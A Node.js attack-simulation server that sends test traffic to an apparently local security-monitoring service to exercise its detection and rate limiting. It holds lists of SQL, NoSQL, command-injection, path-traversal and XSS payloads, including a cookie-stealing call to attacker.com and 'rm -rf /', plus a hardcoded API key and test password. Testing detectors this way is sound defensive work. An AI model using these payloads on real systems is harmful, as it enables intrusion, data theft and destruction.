const express = require('express');
const axios = require('axios');
const { program } = require('commander');

// Configure CLI options
program
  .option('-t, --target <url>', 'Target security service URL', 'http://localhost:8000')
  .option('-k, --api-key <key>', 'API key for security service', 'vk_9f47a6d8-a671-4edf-af38-a097212ac41c')
  .option('-i, --interval <ms>', 'Interval between attacks in milliseconds', '2000')
  .parse(process.argv);

const options = program.opts();

if (!options.apiKey) {
  console.error('❌ API key is required. Use --api-key or -k option.');
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.raw({ type: '*/*' }));

// Security service client
const securityService = axios.create({
  baseURL: options.target,
  headers: {
    'x-api-key': options.apiKey,
    'Content-Type': 'application/json'
  }
});

// Global auth token
let authToken = null;

// Test authentication endpoint and get token
async function testAuth() {
  try {
    // Get credentials from environment variables
    // NEVER hardcode credentials - use environment variables!
    const username = process.env.TEST_USERNAME || 'test@example.com';
    const password = process.env.TEST_PASSWORD;

    if (!password) {
      console.error('❌ TEST_PASSWORD environment variable is required');
      console.error('   Set it with: export TEST_PASSWORD=your_test_password');
      return false;
    }

    // Create form data
    const formData = new URLSearchParams();
    formData.append('username', username);
    formData.append('password', password);
    formData.append('grant_type', 'password');

    const response = await securityService.post('/auth/token', formData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });
    console.log('🔑 Auth successful');
    authToken = response.data.access_token;
    return true;
  } catch (error) {
    console.error('❌ Auth test error:', error.response?.data || error.message);
    return false;
  }
}

// Attack payloads for simulation
const attacks = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users; --",
    "admin' --",
    "' OR id IS NOT NULL; --"
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "javascript:alert(1)",
    `"><script>fetch('http://attacker.com?cookie='+document.cookie)</script>`
  ],
  commandInjection: [
    "; cat /etc/passwd",
    "| ls -la",
    "; rm -rf /",
    "\`id\`",
    "$(whoami)"
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd"
  ],
  noSqlInjection: [
    '{"$gt": ""}',
    '{"$where": "sleep(5000)"}',
    '{"$ne": null}',
    '{"password": {"$regex": "^a"}}',
    '{"$or": [{}, {"admin": true}]}'
  ]
};

// Helper to get random item from array
const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Valid endpoints and methods for focused rate limit testing
const validEndpoints = [
  {
    path: '/auth/token',
    method: 'POST',
    payload: {
      grant_type: 'password',
      username: 'test@vessa.com',
      password: 'Test@123'
    },
    skipAuth: true
  },
  {
    path: '/incidents',
    method: 'GET',
    payload: {
      page: 1,
      page_size: 20,
      status: "open"
    },
    skipAuth: false
  },
  {
    path: '/incidents/analyze-request',
    method: 'POST',
    payload: {
      request_method: "POST",
      request_url: "http://localhost:8000/api/users",
      request_path: "/api/users",
      request_headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "X-Forwarded-For": "192.168.1.100",
        "X-API-Key": "vk_9f47a6d8-a671-4edf-af38-a097212ac41c"
      },
      request_query_params: {
        "id": "1 OR 1=1"
      },
      request_body: {
        "username": "admin' --",
        "password": "' OR '1'='1"
      },
      client_ip: "192.168.1.100",
      timestamp: new Date().toISOString(),
      service_name: "user-service",
      service_version: "1.0.0"
    },
    skipAuth: false
  },
  {
    path: '/incidents/analytics/overview',
    method: 'GET',
    payload: {
      time_range: "24h"
    },
    skipAuth: false
  }
];

// Modified sendMaliciousRequest to use valid endpoints
async function sendMaliciousRequest() {
  const endpoint = getRandomItem(validEndpoints);

  console.log(`\n🚀 Testing rate limit on ${endpoint.path}`);
  console.log(`Method: ${endpoint.method}`);

  try {
    const requestData = {
      method: endpoint.method,
      url: `${options.target}${endpoint.path}`,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/json',
        'x-api-key': options.apiKey
      }
    };

    // Add auth token if needed
    if (!endpoint.skipAuth && authToken) {
      requestData.headers['Authorization'] = `Bearer ${authToken}`;
    }

    if (endpoint.payload) {
      if (endpoint.method === 'GET') {
        requestData.params = endpoint.payload;
      } else {
        requestData.data = endpoint.payload;
      }
    }

    const response = await axios.request(requestData);
    console.log(`✅ Response: ${response.status}`, response.data);

    // Log rate limit headers
    const rateLimit = {
      limit: response.headers['x-ratelimit-limit'],
      remaining: response.headers['x-ratelimit-remaining'],
      reset: response.headers['x-ratelimit-reset'],
      window: response.headers['x-ratelimit-window']
    };
    console.log('📊 Rate Limit Info:', rateLimit);

  } catch (error) {
    if (error.response) {
      console.log(`🚫 Response: ${error.response.status}`, error.response.data);
      // Log rate limit headers even on error
      const rateLimit = {
        limit: error.response.headers['x-ratelimit-limit'],
        remaining: error.response.headers['x-ratelimit-remaining'],
        reset: error.response.headers['x-ratelimit-reset'],
        window: error.response.headers['x-ratelimit-window']
      };
      console.log('📊 Rate Limit Info:', rateLimit);

      // If unauthorized, try to refresh auth token
      if (error.response.status === 401 && !endpoint.skipAuth) {
        console.log('🔄 Refreshing auth token...');
        await testAuth();
      }
    } else {
      console.error('❌ Error:', error.message);
    }
  }
}

// Start attack simulation
let attackInterval;

async function startAttacks() {
  console.log(`\n🎯 Starting attack simulation`);
  console.log(`⏱️  Attack interval: ${options.interval}ms`);
  console.log(`🔒 Security service: ${options.target}`);
  console.log(`🔑 Using API key: ${options.apiKey}`);

  // Get initial auth token
  const authenticated = await testAuth();
  if (!authenticated) {
    console.error('❌ Failed to authenticate. Check credentials.');
    return;
  }

  // Send initial attack
  await sendMaliciousRequest();

  // Schedule recurring attacks
  attackInterval = setInterval(sendMaliciousRequest, Number.parseInt(options.interval));
}

// Control endpoints
app.get('/start', (req, res) => {
  if (!attackInterval) {
    startAttacks();
    res.send('Attack simulation started');
  } else {
    res.send('Attack simulation already running');
  }
});

app.get('/stop', (req, res) => {
  if (attackInterval) {
    clearInterval(attackInterval);
    attackInterval = null;
    res.send('Attack simulation stopped');
  } else {
    res.send('No attack simulation running');
  }
});

app.get('/status', (req, res) => {
  res.json({
    running: !!attackInterval,
    security_service: options.target,
    interval: options.interval,
    api_key: options.apiKey
  });
});

// Test incident creation with malicious payloads
async function testIncidentCreation(payload) {
  try {
    const response = await axios.post(`${securityService}/incidents`, {
      title: payload,
      description: payload,
      severity: "high",
      detection_source: "attack_simulation",
      reporter_id: "system",
      affected_assets: ["web-server"],
      tags: ["test", "attack-simulation"]
    }, {
      headers: {
        'Authorization': `Bearer ${options.apiKey}`,
        'Content-Type': 'application/json'
      }
    });
    return response;
  } catch (error) {
    console.error('Error creating incident:', error.response?.data || error.message);
    return error.response;
  }
}

// Test malicious request analysis
async function testRequestAnalysis(payload) {
  try {
    const response = await axios.post(`${securityService}/incidents/analyze-request`, {
      request_method: "POST",
      request_url: `${securityService}/test`,
      request_path: "/test",
      request_headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'attack-simulation/1.0'
      },
      request_body: payload,
      client_ip: "192.168.1.1"
    }, {
      headers: {
        'Authorization': `Bearer ${options.apiKey}`,
        'Content-Type': 'application/json'
      }
    });
    return response;
  } catch (error) {
    console.error('Error analyzing request:', error.response?.data || error.message);
    return error.response;
  }
}

// Attack simulation loop
async function runAttackSimulation() {
  console.log('🎯 Starting attack simulation');
  console.log('⏱️  Attack interval:', options.interval + 'ms');
  console.log('🔒 Security service:', securityService);
  console.log('🔑 Using API key:', options.apiKey);

  // Test authentication
  try {
    const authResponse = await axios.get(`${securityService}/incidents`, {
      headers: { 'Authorization': `Bearer ${options.apiKey}` }
    });
    console.log('🔑 Auth successful');
  } catch (error) {
    console.error('❌ Auth failed:', error.response?.data || error.message);
    return;
  }

  // Start attack loop
  while (attackInterval) {
    // SQL Injection attacks
    for (const payload of attacks.sqlInjection) {
      await testIncidentCreation(payload);
      await testRequestAnalysis(payload);
      await new Promise(resolve => setTimeout(resolve, Number.parseInt(options.interval)));
    }

    // XSS attacks
    for (const payload of attacks.xss) {
      await testIncidentCreation(payload);
      await testRequestAnalysis(payload);
      await new Promise(resolve => setTimeout(resolve, Number.parseInt(options.interval)));
    }

    // Path traversal attacks
    for (const payload of attacks.pathTraversal) {
      await testIncidentCreation(payload);
      await testRequestAnalysis(payload);
      await new Promise(resolve => setTimeout(resolve, Number.parseInt(options.interval)));
    }

    // Command injection attacks
    for (const payload of attacks.commandInjection) {
      await testIncidentCreation(payload);
      await testRequestAnalysis(payload);
      await new Promise(resolve => setTimeout(resolve, Number.parseInt(options.interval)));
    }
  }
}

// Start server
const port = 3333;
app.listen(port, () => {
  console.log(`\n🔥 Attack simulation server running on port ${port}`);
  console.log(`🔒 Target security service: ${options.target}`);
  console.log('\nAvailable endpoints:');
  console.log('  GET  /start   - Start attack simulation');
  console.log('  GET  /stop    - Stop attack simulation');
  console.log('  GET  /status  - Get simulation status\n');

  // Start attacks automatically if not in manual mode
  if (!process.argv.includes('--manual')) {
    startAttacks();
  }
}); 